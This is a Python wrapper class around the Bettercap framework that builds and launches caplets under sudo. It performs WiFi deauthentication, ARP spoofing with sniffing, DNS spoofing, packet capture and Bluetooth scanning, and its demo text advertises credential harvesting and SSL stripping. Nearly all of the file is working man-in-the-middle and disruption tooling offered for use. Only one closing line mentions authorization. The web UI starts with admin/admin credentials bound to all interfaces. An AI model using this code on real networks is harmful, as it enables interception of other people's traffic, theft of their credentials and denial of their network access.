#!/usr/bin/env python3
"""
Bettercap Integration - WiFi, Bluetooth, Network MITM Framework
Production-ready network reconnaissance and attack framework
"""

import subprocess
import json
import logging
import os
import time
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)


class BettercapIntegration:
    """
    Bettercap Framework Integration
    Swiss Army knife for WiFi, Bluetooth, HID, and network attacks
    """
    
    def __init__(self):
        self.bettercap_path = self._find_bettercap()
        self.process = None
        self.web_ui_port = 8083
        
    def _find_bettercap(self) -> Optional[str]:
        """Locate bettercap binary"""
        result = subprocess.run(["which", "bettercap"], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        return None
    
    def install_bettercap(self) -> Dict[str, any]:
        """Install bettercap"""
        logger.info("Installing bettercap...")
        
        try:
            result = subprocess.run(
                ["sudo", "apt", "install", "-y", "bettercap"],
                capture_output=True,
                text=True,
                timeout=300
            )
            
            if result.returncode == 0:
                self.bettercap_path = "/usr/bin/bettercap"
                return {
                    "success": True,
                    "message": "Bettercap installed successfully"
                }
            else:
                return {
                    "success": False,
                    "error": result.stderr
                }
                
        except Exception as e:
            logger.error(f"Installation failed: {e}")
            return {"success": False, "error": str(e)}
    
    def start_wifi_recon(self, interface: str = "wlan0") -> Dict[str, any]:
        """
        Start WiFi reconnaissance
        
        Args:
            interface: Wireless interface
        """
        if not self.bettercap_path:
            return {"success": False, "error": "Bettercap not installed"}
        
        logger.info(f"Starting WiFi recon on {interface}")
        
        try:
            caplet = f"""
set wifi.interface {interface}
wifi.recon on
wifi.show
"""
            
            caplet_file = "/tmp/wifi_recon.cap"
            with open(caplet_file, 'w') as f:
                f.write(caplet)
            
            cmd = ["sudo", self.bettercap_path, "-iface", interface, "-caplet", caplet_file]
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            return {
                "success": True,
                "message": f"WiFi reconnaissance started on {interface}",
                "pid": self.process.pid
            }
            
        except Exception as e:
            logger.error(f"WiFi recon failed: {e}")
            return {"success": False, "error": str(e)}
    
    def wifi_deauth(self, target_bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF",
                    interface: str = "wlan0") -> Dict[str, any]:
        """
        WiFi deauthentication attack
        
        Args:
            target_bssid: Target access point BSSID
            client_mac: Client MAC (FF:FF:FF:FF:FF:FF for broadcast)
            interface: Wireless interface
        """
        logger.info(f"Deauth attack: {target_bssid} -> {client_mac}")
        
        try:
            caplet = f"""
set wifi.interface {interface}
wifi.recon on
sleep 5
wifi.deauth {target_bssid}
"""
            
            caplet_file = "/tmp/wifi_deauth.cap"
            with open(caplet_file, 'w') as f:
                f.write(caplet)
            
            result = subprocess.run(
                ["sudo", self.bettercap_path, "-iface", interface, "-caplet", caplet_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "success": True,
                "message": f"Deauth attack sent to {target_bssid}",
                "target": target_bssid,
                "client": client_mac
            }
            
        except Exception as e:
            logger.error(f"Deauth attack failed: {e}")
            return {"success": False, "error": str(e)}
    
    def start_web_ui(self, port: int = 8083, username: str = "admin", 
                     password: str = "admin") -> Dict[str, any]:
        """
        Start Bettercap Web UI
        
        Args:
            port: Web UI port
            username: Login username
            password: Login password
        """
        logger.info(f"Starting Bettercap Web UI on port {port}")
        
        try:
            caplet = f"""
set http.server.address 0.0.0.0
set http.server.port {port}
set api.rest.username {username}
set api.rest.password {password}
http.server on
api.rest on
ui.update
ui on
"""
            
            caplet_file = "/tmp/webui.cap"
            with open(caplet_file, 'w') as f:
                f.write(caplet)
            
            self.process = subprocess.Popen(
                ["sudo", self.bettercap_path, "-caplet", caplet_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            self.web_ui_port = port
            
            return {
                "success": True,
                "message": f"Web UI started at https://localhost:{port}",
                "url": f"https://localhost:{port}",
                "username": username,
                "password": password,
                "pid": self.process.pid
            }
            
        except Exception as e:
            logger.error(f"Web UI start failed: {e}")
            return {"success": False, "error": str(e)}
    
    def arp_spoof(self, target_ip: str, gateway_ip: str, 
                  interface: str = "eth0") -> Dict[str, any]:
        """
        ARP spoofing attack
        
        Args:
            target_ip: Target IP address
            gateway_ip: Gateway IP address
            interface: Network interface
        """
        logger.info(f"ARP spoofing: {target_ip} <-> {gateway_ip}")
        
        try:
            caplet = f"""
set arp.spoof.targets {target_ip}
set arp.spoof.internal true
arp.spoof on
net.sniff on
"""
            
            caplet_file = "/tmp/arp_spoof.cap"
            with open(caplet_file, 'w') as f:
                f.write(caplet)
            
            self.process = subprocess.Popen(
                ["sudo", self.bettercap_path, "-iface", interface, "-caplet", caplet_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            return {
                "success": True,
                "message": f"ARP spoofing started: {target_ip} <-> {gateway_ip}",
                "target": target_ip,
                "gateway": gateway_ip,
                "pid": self.process.pid
            }
            
        except Exception as e:
            logger.error(f"ARP spoofing failed: {e}")
            return {"success": False, "error": str(e)}
    
    def dns_spoof(self, domain: str, spoof_ip: str, interface: str = "eth0") -> Dict[str, any]:
        """
        DNS spoofing attack
        
        Args:
            domain: Target domain
            spoof_ip: IP to spoof
            interface: Network interface
        """
        logger.info(f"DNS spoofing: {domain} -> {spoof_ip}")
        
        try:
            caplet = f"""
set dns.spoof.domains {domain}
set dns.spoof.address {spoof_ip}
dns.spoof on
"""
            
            caplet_file = "/tmp/dns_spoof.cap"
            with open(caplet_file, 'w') as f:
                f.write(caplet)
            
            result = subprocess.run(
                ["sudo", self.bettercap_path, "-iface", interface, "-caplet", caplet_file],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            return {
                "success": True,
                "message": f"DNS spoofing configured: {domain} -> {spoof_ip}",
                "domain": domain,
                "spoof_ip": spoof_ip
            }
            
        except Exception as e:
            logger.error(f"DNS spoofing failed: {e}")
            return {"success": False, "error": str(e)}
    
    def bluetooth_recon(self) -> Dict[str, any]:
        """Bluetooth device reconnaissance"""
        logger.info("Starting Bluetooth reconnaissance")
        
        try:
            caplet = """
ble.recon on
ble.show
"""
            
            caplet_file = "/tmp/ble_recon.cap"
            with open(caplet_file, 'w') as f:
                f.write(caplet)
            
            result = subprocess.run(
                ["sudo", self.bettercap_path, "-caplet", caplet_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "success": True,
                "message": "Bluetooth reconnaissance completed",
                "output": result.stdout
            }
            
        except Exception as e:
            logger.error(f"Bluetooth recon failed: {e}")
            return {"success": False, "error": str(e)}
    
    def packet_sniffer(self, interface: str = "eth0", filter_exp: str = "") -> Dict[str, any]:
        """
        Network packet sniffer
        
        Args:
            interface: Network interface
            filter_exp: BPF filter expression
        """
        logger.info(f"Starting packet sniffer on {interface}")
        
        try:
            caplet = f"""
set net.sniff.verbose true
set net.sniff.local true
"""
            if filter_exp:
                caplet += f'set net.sniff.filter "{filter_exp}"\n'
            
            caplet += "net.sniff on\n"
            
            caplet_file = "/tmp/packet_sniff.cap"
            with open(caplet_file, 'w') as f:
                f.write(caplet)
            
            self.process = subprocess.Popen(
                ["sudo", self.bettercap_path, "-iface", interface, "-caplet", caplet_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            return {
                "success": True,
                "message": f"Packet sniffer started on {interface}",
                "filter": filter_exp,
                "pid": self.process.pid
            }
            
        except Exception as e:
            logger.error(f"Packet sniffer failed: {e}")
            return {"success": False, "error": str(e)}
    
    def stop(self) -> Dict[str, any]:
        """Stop running Bettercap process"""
        if self.process:
            self.process.terminate()
            self.process.wait(timeout=5)
            return {"success": True, "message": "Bettercap stopped"}
        return {"success": False, "message": "No process running"}


def demonstrate_bettercap():
    """Demonstrate Bettercap capabilities"""
    print("\n" + "="*70)
    print("BETTERCAP - NETWORK ATTACK FRAMEWORK")
    print("="*70)
    
    bettercap = BettercapIntegration()
    
    print("\n[*] Production Features:")
    print("    ✓ WiFi reconnaissance and attacks")
    print("    ✓ ARP/DNS spoofing (MITM)")
    print("    ✓ Packet sniffing and analysis")
    print("    ✓ Bluetooth Low Energy (BLE) attacks")
    print("    ✓ HTTP/HTTPS interception")
    print("    ✓ Web-based UI with RESTful API")
    print("    ✓ Scriptable with caplets")
    
    print("\n[*] WiFi Attacks:")
    print("    • Deauthentication")
    print("    • Handshake capture")
    print("    • Fake AP (Evil Twin)")
    print("    • PMKID attacks")
    
    print("\n[*] Network MITM:")
    print("    • ARP spoofing")
    print("    • DNS spoofing")
    print("    • SSL stripping")
    print("    • Credential harvesting")
    
    print("\n[*] Usage Examples:")
    print("    WiFi Recon: bettercap.start_wifi_recon('wlan0')")
    print("    Deauth: bettercap.wifi_deauth('AA:BB:CC:DD:EE:FF')")
    print("    ARP Spoof: bettercap.arp_spoof('192.168.1.100', '192.168.1.1')")
    print("    Web UI: bettercap.start_web_ui(8083)")
    
    print("\n[!] Authorization Required: Network attacks require explicit permission")
    print("="*70)


if __name__ == "__main__":
    demonstrate_bettercap()
